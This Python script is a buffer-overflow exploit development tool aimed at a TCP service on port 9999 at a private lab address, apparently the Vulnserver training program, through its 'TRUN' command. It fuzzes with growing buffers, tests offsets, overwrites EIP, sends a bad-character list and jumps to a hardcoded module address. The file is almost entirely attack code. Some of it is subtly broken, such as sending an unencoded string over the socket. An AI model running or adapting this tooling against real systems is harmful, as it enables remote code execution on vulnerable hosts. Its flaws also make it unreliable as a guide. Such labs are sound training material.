#!/usr/bin/python3
import sys
import socket
from time import sleep


def border():
    print("-" * 50)


def server_error():
    print("Error connecting to server")
    border()
    sys.exit()


def try_fuzzing(target_ip, target_port, cmd_attacking):
    buffer = "A" * 100
    while True:
        try:
            print(f'Trying buffer size of {str(len(buffer))} bytes')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            payload = (cmd_attacking + buffer)
            s.send((payload.encode()))
            s.close()
            sleep(1)
            buffer += "A" * 100
        except:
            print(f"Fuzzing crashed at %s bytes {str(len(buffer))}")
            border()
            sys.exit()


def try_offset(target_ip, target_port, cmd_attacking):
    offset = str(input("Enter the offset: "))
    try:
        print("\n\nTrying the offset now.")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        payload = cmd_attacking + offset
        s.send(payload.encode())
        s.close()
        border()
    except:
        server_error()


def try_overwrite_eip(target_ip, target_port, cmd_attacking):
    offset = int(input("Enter the exact offset value: "))
    shellcode = "A" * offset + "B" * 4

    try:
        print(f"\nTrying the offset {offset}, the expected EIP value should be 42424242.")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        payload = cmd_attacking + shellcode
        s.send(payload.encode())
        s.close()
        border()
    except:
        server_error()


def try_bad_chars(target_ip, target_port, cmd_attacking):
    bad_chars = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
        "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
        "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )

    offset = int(input("Enter the exact offset value: "))
    shellcode = "A" * offset + "B" * 4 + bad_chars

    try:
        print("Trying bad characters. Look in the Hex Dump of the ESP.")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        payload = cmd_attacking + shellcode
        s.send(payload.encode())
        s.close()
        border()
    except:
        server_error()


def convert_to_little_endian_format(address):
    # Example for address 625011af == "\xaf\x11\x50\x62"
    x_sting = "\\x"
    little_endian = address[::-1]
    little_endian = f"{x_sting}{little_endian[1]}{little_endian[0]}{x_sting}{little_endian[3]}{little_endian[2]}{x_sting}{little_endian[5]}{little_endian[4]}{x_sting}{little_endian[7]}{little_endian[6]}"
    print(f"Little endian address: {little_endian}")
    return str(little_endian)


def try_right_modules(target_ip, target_port, cmd_attacking):
    offset = 2003
    address = "625011af"
    # offset = int(input("Enter the exact offset value: "))
    # address = str(input("Enter the EIP address of the module: "))
    endian_address = "\xaf\x11\x50\x62"
    shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

    try:
        print("Trying module. EIP should show the correct module name.")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        payload = cmd_attacking + shellcode
        s.send(payload)
        s.close()
    except:
        server_error()


def main():
    target_ip = "192.168.57.13"
    target_port = 9999
    cmd_attacking = 'TRUN /.:/'
    # target_ip = str(input('Enter victim ip: '))
    # target_port = int(input('Enter victim port: '))
    # cmd_attacking = str(input('Enter cmd to attack: '))

    border()
    print("Options: \n\n1. Fuzzing \n2. Offset \n3. Overwrite EIP \n4. Bad Chars \n5. Right Modules \n")
    option = int(input("Enter option: "))
    border()

    if option == 1:
        try_fuzzing(target_ip, target_port, cmd_attacking)
    elif option == 2:
        try_offset(target_ip, target_port, cmd_attacking)
    elif option == 3:
        try_overwrite_eip(target_ip, target_port, cmd_attacking)
    elif option == 4:
        try_bad_chars(target_ip, target_port, cmd_attacking)
    elif option == 5:
        try_right_modules(target_ip, target_port, cmd_attacking)


main()
